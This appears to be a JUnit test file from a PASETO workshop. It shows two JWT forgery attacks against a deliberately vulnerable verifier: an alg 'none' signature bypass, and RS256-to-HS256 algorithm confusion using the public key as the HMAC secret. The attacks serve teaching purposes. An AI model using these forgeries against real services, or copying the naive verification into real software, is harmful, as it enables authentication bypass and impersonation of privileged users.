package com.webcodein.workshop.paseto.engine;

import com.webcodein.workshop.paseto.model.TokenValidationResult;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.util.Base64;

import static org.assertj.core.api.Assertions.assertThat;

class VulnerableJwtVerifierTest {

    @Test
    @DisplayName("Demonstrates vulnerability: 'none' algorithm bypass in naive JWT verifier")
    void shouldDemonstrateNoneAlgorithmBypass() {
        VulnerableJwtVerifier verifier = new VulnerableJwtVerifier(null, "secret123".getBytes(StandardCharsets.UTF_8));

        // Attacker creates header with alg: "none" and no signature
        String header = Base64.getUrlEncoder().withoutPadding().encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8));
        String payload = Base64.getUrlEncoder().withoutPadding().encodeToString("{\"sub\":\"attacker_admin\",\"iss\":\"auth\",\"exp\":9999999999}".getBytes(StandardCharsets.UTF_8));
        String forgedJwt = header + "." + payload + ".";

        TokenValidationResult result = verifier.verifyVulnerableJwt(forgedJwt);
        // Vulnerable implementation accepts "none" signature
        assertThat(result.valid()).isTrue();
        assertThat(result.claims().subject()).isEqualTo("attacker_admin");
    }

    @Test
    @DisplayName("Demonstrates vulnerability: Algorithm confusion (RS256 switched to HS256 using public key)")
    void shouldDemonstrateAlgorithmConfusionVulnerability() throws Exception {
        // Server generates RSA keypair
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair keyPair = kpg.generateKeyPair();

        VulnerableJwtVerifier verifier = new VulnerableJwtVerifier(keyPair.getPublic(), null);

        // Attacker knows the RSA public key (it's public!) and signs a token with HMAC using the public key bytes
        String header = Base64.getUrlEncoder().withoutPadding().encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8));
        String payload = Base64.getUrlEncoder().withoutPadding().encodeToString("{\"sub\":\"forged_superuser\",\"iss\":\"auth\",\"exp\":9999999999}".getBytes(StandardCharsets.UTF_8));
        String signingInput = header + "." + payload;

        Mac hmac = Mac.getInstance("HmacSHA256");
        hmac.init(new SecretKeySpec(keyPair.getPublic().getEncoded(), "HmacSHA256"));
        byte[] sig = hmac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));
        String forgedJwt = signingInput + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(sig);

        // Vulnerable server checks "alg" in header, sees HS256, and verifies signature with public key as secret!
        TokenValidationResult result = verifier.verifyVulnerableJwt(forgedJwt);
        assertThat(result.valid()).isTrue();
        assertThat(result.claims().subject()).isEqualTo("forged_superuser");
    }
}
